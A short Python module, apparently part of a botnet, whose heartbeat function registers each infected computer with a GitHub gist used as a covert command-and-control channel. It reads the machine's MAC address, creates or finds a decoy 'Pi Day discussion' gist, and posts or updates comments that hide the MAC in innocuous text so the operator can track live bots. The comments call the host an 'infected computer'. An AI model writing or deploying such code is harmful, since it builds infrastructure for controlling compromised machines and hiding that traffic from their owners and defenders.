from api_wrapper import get_gist_id_from_description, get_comments, create_comment, update_comment, create_gist
import steganography
import uuid

# Send a POST request to the README.md gist to create a comment (or update an existing one)
def heartbeat(): 
    mac = str(uuid.getnode())
    
    # Find the id of the gist that manages alive devices (Pi Day discussion)
    alive_gist_id = get_gist_id_from_description("Pi Day discussion") 
    
        # Create the gist if it does not exist
    if not alive_gist_id:
        create_gist("Pi Day discussion", steganography.pi_day_discussion_body, file_name="pi.md")
        alive_gist_id = get_gist_id_from_description("Pi Day discussion")
        
    comments = get_comments(alive_gist_id, cipher=False) 

        # Find if this infected computer has already commented on the gist
        # If it has commented, update the comment to show that it is still alive
        # If it hasn't, create a new comment to show that it is a new computer in the botnet
    if any(mac in (match := comment)["body"] for comment in comments): 
        
        # If the comment has a trailing space, we will remove it and viceversa, so messages are different.
        # If we were to sent the same exact message, the comment would not be updated
        has_trailing_space = match["body"].endswith(" ")
        message = match["body"][:-1] if has_trailing_space else match["body"] + " "
        update_comment(alive_gist_id, match["id"], message, cipher=False)
    else:
        random_message = steganography.luck[int(mac) % len(steganography.luck)]
        create_comment(alive_gist_id, random_message.replace("DIGIT", mac), cipher=False)
